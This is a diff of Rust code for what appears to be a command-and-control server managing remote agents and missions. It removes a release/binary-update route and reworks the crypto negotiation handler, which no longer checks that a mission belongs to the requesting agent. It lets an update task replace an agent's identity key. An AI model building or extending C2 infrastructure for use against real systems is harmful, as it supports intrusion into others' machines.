@@ -12,11 +12,9 @@ use crate::{services, C2State};
 
 mod agents;
 mod missions;
-mod releases;
 
 pub const AGENT_NOT_FOUND: &str = "Agent not found.";
 pub const MISSION_NOT_FOUND: &str = "Mission not found.";
-pub const RELEASE_NOT_FOUND: &str = "Release not found.";
 
 // TODO Either encrypt all routes or listen on a different interface for admin routes
 // TODO Try to propagate errors using impl IntoResponse for better error handling
@@ -31,16 +29,8 @@ pub fn init_router() -> Router<C2State> {
                 .route("/", post(agents::create).get(agents::get))
                 .nest(
                     "/:agent_id",
-                    Router::new()
-                        .route("/", put(agents::update))
-                        .route("/update", put(agents::update_bin)),
+                    Router::new().route("/", put(agents::update)), // .route("/update", put(agents::update_bin)),
                 ),
-        )
-        .nest(
-            "/releases",
-            Router::new()
-                .route("/", post(releases::create).get(releases::get))
-                .route("/:release_id", get(releases::get_by_checksum)),
         )
         .nest(
             "/missions",
@@ -53,36 +43,18 @@ pub fn init_router() -> Router<C2State> {
         )
 }
 
+// TODO When agent is updating, it gets another identity key pair.
+// Check whether it is good to update the agent's identity key pair here.
 async fn get_crypto(
     State(mut c2_state): State<C2State>,
     Path(mission_id): Path<i32>,
     crypto_negociation: Json<model::CryptoNegociation>,
 ) -> impl IntoResponse {
-    // Check agent & agent exists
-    let agent = match crypto_negociation.verify() {
-        Ok(_) => {
-            match services::agents::get_by_identity(
-                c2_state.conn.clone(),
-                crypto_negociation.identity.to_bytes(),
-            ) {
-                Ok(Some(agent)) => agent,
-                Ok(None) => {
-                    warn!("Agent not found");
-                    return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
-                }
-                Err(e) => {
-                    error!("{e}");
-                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
-                }
-            }
-        }
-        Err(e) => {
-            error!("{e}");
-            return (StatusCode::UNAUTHORIZED).into_response();
-        }
-    };
+    if let Err(e) = crypto_negociation.verify() {
+        error!("{e}");
+        return (StatusCode::UNAUTHORIZED).into_response();
+    }
 
-    // Check mission exists
     let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
         Ok(Some(m)) => m,
         Ok(None) => {
@@ -95,13 +67,36 @@ async fn get_crypto(
         }
     };
 
-    // Check mission is not completed and is for the agent
-    if mission.completed_at.is_some() || mission.agent_id != agent.id {
-        warn!(
-            "Mission [{}] is completed or not affected to agent [{}]",
-            mission_id, agent.id
-        );
+    if mission.completed_at.is_some() {
+        warn!("Mission [{}] is already completed", mission_id);
         return (StatusCode::BAD_REQUEST).into_response();
+    }
+
+    let agent = match services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id) {
+        Ok(Some(agent)) => agent,
+        Ok(None) => {
+            warn!("Agent not found");
+            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
+        }
+        Err(e) => {
+            error!("{e}");
+            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+        }
+    };
+
+    if let model::Task::Update(release) = mission.task {
+        if release.verifying_key == crypto_negociation.identity {
+            if let Err(e) = services::agents::update_by_id(
+                c2_state.conn.clone(),
+                &model::Agent {
+                    identity: release.verifying_key,
+                    ..agent
+                },
+            ) {
+                error!("{e}");
+                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+            }
+        }
     }
 
     let (private_key, crypto_negociation) =
